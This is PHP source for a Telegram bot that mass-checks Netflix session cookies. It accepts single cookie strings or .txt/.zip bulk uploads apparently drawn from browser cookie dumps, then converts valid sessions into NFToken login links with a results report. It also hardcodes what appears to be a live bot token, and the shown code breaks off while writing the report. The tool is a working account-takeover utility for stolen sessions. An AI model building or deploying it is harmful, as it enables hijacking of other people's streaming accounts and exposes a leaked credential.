<?php
header('Content-Type: application/json');
require_once 'netflix_checker.php';

// ⚠️ CHANGE THIS TO YOUR BOT TOKEN
$BOT_TOKEN = '8415448403:AAHP7JraAh9XKbzCFew7QuRaeW3WGRODtdw';
$WEBHOOK_URL = 'https://your-vercel-app.vercel.app/api'; // Auto-set by Vercel

$checker = new NetflixTokenChecker();
$user_data = []; // Simple session storage (Vercel stateless)

// Telegram API base URL
$api_url = "https://api.telegram.org/bot$BOT_TOKEN/";

// Get webhook update
$update = json_decode(file_get_contents('php://input'), true);
if (!$update || !isset($update['message'])) exit('OK');

// Extract message data
$message = $update['message'];
$chat_id = $message['chat']['id'];
$user_id = $message['from']['id'];
$text = $message['text'] ?? '';
$document = $message['document'] ?? null;

// Send typing action
sendAction($chat_id, 'typing');

function sendMessage($chat_id, $text, $parse_mode = 'Markdown', $reply_markup = null) {
    global $api_url;
    $data = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => $parse_mode
    ];
    if ($reply_markup) $data['reply_markup'] = $reply_markup;
    
    $ch = curl_init("$api_url/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($data),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true
    ]);
    curl_exec($ch);
    curl_close($ch);
}

function sendAction($chat_id, $action) {
    global $api_url;
    $data = ['chat_id' => $chat_id, 'action' => $action];
    $ch = curl_init("$api_url/sendChatAction");
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($data),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true
    ]);
    curl_exec($ch);
    curl_close($ch);
}

function sendDocument($chat_id, $document, $caption = '') {
    global $api_url;
    $data = [
        'chat_id' => $chat_id,
        'caption' => $caption
    ];
    
    if (is_string($document)) {
        $data['document'] = $document;
    } else {
        $data['document'] = new CURLFile($document['path'] ?? '', $document['mime_type'] ?? '');
    }
    
    $ch = curl_init("$api_url/sendDocument");
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_RETURNTRANSFER => true
    ]);
    curl_exec($ch);
    curl_close($ch);
}

// Handle commands
if (strpos($text, '/start') === 0 || strpos($text, '/help') === 0) {
    $help_text = "🎬 **Netflix NFToken Checker Bot**\n\n" .
        "**Commands:**\n" .
        "• `/chk <cookie_string>` - Check a single Netflix cookie\n" .
        "• `/batch` - Upload a .txt or .zip file with multiple cookies\n\n" .
        "**Supported formats:**\n" .
        "• Netscape format (browser exports)\n" .
        "• Raw cookie strings\n" .
        "• JSON format\n\n" .
        "**Required cookies:**\n" .
        "• NetflixId\n" .
        "• SecureNetflixId\n" .
        "• nfvdid";
    sendMessage($chat_id, $help_text);
    
} elseif (strpos($text, '/chk') === 0) {
    $cookie_string = trim(substr($text, 4));
    if (empty($cookie_string)) {
        sendMessage($chat_id, "❌ **Please provide a cookie string.**\n\n**Usage:** `/chk NetflixId=xxx; SecureNetflixId=xxx; nfvdid=xxx`", 'Markdown');
        exit('OK');
    }
    
    $cookies_list = $checker->extractCookiesFromText($cookie_string);
    if (empty($cookies_list)) {
        sendMessage($chat_id, "❌ **No valid Netflix cookies found**\n\nRequired: NetflixId, SecureNetflixId, nfvdid", 'Markdown');
        exit('OK');
    }
    
    $cookie_dict = $cookies_list[0];
    list($success, $token, $error) = $checker->checkCookie($cookie_dict);
    
    if ($success && $token) {
        $link = $checker->formatNftokenLink($token);
        $cookies_text = '';
        foreach ($cookie_dict as $k => $v) {
            $cookies_text .= "• `$k`: `${substr($v, 0, 30)}...`\n";
        }
        sendMessage($chat_id, "✅ **Success!**\n\n**NFToken:** `$token`\n**Link:** $link\n\n**Cookies used:**\n" . $cookies_text, 'Markdown');
    } else {
        $cookies_text = '';
        if (!empty($cookie_dict)) {
            foreach ($cookie_dict as $k => $v) {
                $cookies_text .= "• `$k`: `${substr($v, 0, 30)}...`\n";
            }
        }
        sendMessage($chat_id, "❌ **Failed!**\n\n**Error:** `$error`\n\n**Cookies provided:**\n" . $cookies_text, 'Markdown');
    }
    
} elseif (strpos($text, '/batch') === 0) {
    // Store batch mode in simple cache (Vercel stateless - use Redis for production)
    file_put_contents("/tmp/batch_$user_id", '1', LOCK_EX);
    sendMessage($chat_id, "📁 **Please upload a file**\n\nAccepted formats:\n• `.txt` - Netscape format or raw cookies\n• `.zip` - Contains multiple cookie files\n\n**File size limit:** 20MB", 'Markdown');
    
} elseif ($document) {
    // Check if batch mode is active
    $batch_mode = file_exists("/tmp/batch_$user_id");
    if (!$batch_mode) {
        sendMessage($chat_id, "❌ Please use `/batch` command first before uploading files.", 'Markdown');
        exit('OK');
    }
    
    // Clean up batch mode flag
    @unlink("/tmp/batch_$user_id");
    
    $filename = $document['file_name'];
    $file_id = $document['file_id'];
    $file_size = $document['file_size'];
    
    if ($file_size > 20 * 1024 * 1024) {
        sendMessage($chat_id, "❌ File too large. Maximum size: 20MB");
        exit('OK');
    }
    
    sendMessage($chat_id, "📥 Downloading file...");
    
    // Download file from Telegram
    $file_info = json_decode(file_get_contents("$api_url/getFile?file_id=$file_id"), true);
    if (!$file_info || !isset($file_info['result']['file_path'])) {
        sendMessage($chat_id, "❌ Failed to get file info");
        exit('OK');
    }
    
    $file_path = $file_info['result']['file_path'];
    $download_url = "https://api.telegram.org/file/bot$BOT_TOKEN/$file_path";
    
    $file_content = file_get_contents($download_url);
    if ($file_content === false) {
        sendMessage($chat_id, "❌ Failed to download file");
        exit('OK');
    }
    
    $all_cookies = [];
    
    if (str_ends_with(strtolower($filename), '.zip')) {
        sendMessage($chat_id, "📦 Processing zip file: $filename");
        
        $zip = new ZipArchive();
        if ($zip->open('data://application/zip;base64,' . base64_encode($file_content)) === TRUE) {
            for ($i = 0; $i < $zip->numFiles; $i++) {
                $stat = $zip->statIndex($i);
                if (str_ends_with($stat['name'], '.txt')) {
                    $content = $zip->getFromIndex($i);
                    $cookies = $checker->extractCookiesFromText($content);
                    foreach ($cookies as $cookie_dict) {
                        $all_cookies[] = ['source' => $stat['name'], 'cookies' => $cookie_dict];
                    }
                }
            }
            $zip->close();
        }
        
    } elseif (str_ends_with(strtolower($filename), '.txt')) {
        $cookies = $checker->extractCookiesFromText($file_content);
        foreach ($cookies as $cookie_dict) {
            $all_cookies[] = ['source' => $filename, 'cookies' => $cookie_dict];
        }
    } else {
        sendMessage($chat_id, "❌ Unsupported file type. Please upload .txt or .zip files.");
        exit('OK');
    }
    
    if (empty($all_cookies)) {
        sendMessage($chat_id, "❌ No valid Netflix cookies found in the file.");
        exit('OK');
    }
    
    sendMessage($chat_id, "🔍 Checking " . count($all_cookies) . " cookie sets...");
    
    $results = [];
    foreach ($all_cookies as $item) {
        list($success, $token, $error) = $checker->checkCookie($item['cookies']);
        
        $result = [
            'source' => $item['source'],
            'success' => $success,
            'cookies' => $item['cookies'],
            'cookie_preview' => ''
        ];
        
        foreach ($item['cookies'] as $k => $v) {
            $result['cookie_preview'] .= "$k=" . substr($v, 0, 15) . "...; ";
        }
        
        if ($success && $token) {
            $result['token'] = $token;
            $result['link'] = $checker->formatNftokenLink($token);
        } else {
            $result['error'] = $error;
        }
        $results[] = $result;
    }
    
    // Generate report
    $total = count($results);
    $success_count = count(array_filter($results, fn($r) => $r['success']));
    $failed_count = $total - $success_count;
    
    $summary = "📊 **Batch Check Complete**\n\n" .
        "📁 **File:** `$filename`\n" .
        "✅ **Successful:** $success_count\n" .
        "❌ **Failed:** $failed_count\n" .
        "📝 **Total:** $total\n\n" .
        "📎 **Detailed results file attached below**";
    
    sendMessage($chat_id, $summary, 'Markdown');
    
    // Create results file
    $output = "NETFLIX COOKIE CHECK RESULTS\n";
    $output .= str_repeat("=", 60) . "\n\n";
    $output .= "Generated: " . date('Y-m-d H:i:s') . "\n";
    $output .= "File: $filename\n";